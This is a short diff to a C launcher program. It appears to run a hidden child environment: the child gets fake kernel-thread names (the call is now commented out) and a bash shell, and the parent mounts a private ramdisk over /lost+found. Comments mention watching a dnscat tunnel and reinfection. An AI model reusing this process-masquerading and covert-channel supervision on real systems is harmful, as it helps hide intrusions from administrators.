@@ -236,15 +236,15 @@ int main(int argc, char **argv)
                 if (mount("proc", "/proc", "proc", mountflags, NULL) < 0)
                         err_exit("Cannot remount '/proc'");
 
-                make_fake_kthreads(kthreads_names);
+                //make_fake_kthreads(kthreads_names);
                 sleep(5);	/* wait for completion */
                 system("/bin/bash");
         } else {
                 /* Parent process */
 
                 /* plop a ramdisk over lost+found for our use */
-		if (mount("tmpfs", "/lost+found", "tmpfs", MS_PRIVATE | MS_STRICTATIME, "mode=755") < 0)
-                        err_exit("couldn't mount ramdisk!");
+		//if (mount("tmpfs", "/lost+found", "tmpfs", MS_PRIVATE | MS_STRICTATIME, "mode=755") < 0)i
+          //              err_exit("couldn't mount ramdisk!");
 
                 /* install signal handler to handle signal delivered
                  * ctrl-alt-delete, which we will send to child init
@@ -262,7 +262,8 @@ int main(int argc, char **argv)
 		if (mount(NULL, "/", NULL, MS_REMOUNT | MS_RELATIME,
 			  "errors=remount-ro,data=ordered") < 0)
                         err_exit("couldn't remount /");
-                system("echo ciao > /lost+found/file.txt");
+                system("mount -t tmpfs tmpfs /lost+found --make-private");
+                system("echo 'This is not visible to child process'  > /lost+found/file.txt");
 
                 /* watching for dnscat exit
                  * also, watching for reinfection
